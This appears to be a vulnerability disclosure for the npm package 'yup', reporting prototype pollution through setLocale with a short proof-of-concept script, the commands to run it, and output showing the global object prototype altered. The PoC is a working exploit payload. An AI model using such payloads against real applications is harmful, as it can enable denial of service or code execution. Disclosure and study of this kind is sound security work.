# Description

`yup` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
let yup = require('yup');
const payload = JSON.parse('{"__proto__":{"polluted":"Yes! Its Polluted"}}');
yup.setLocale(payload);
console.log({}.polluted)
```

2. Execute the following commands in another terminal:

```bash
npm i yup # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Yes! Its Polluted
```
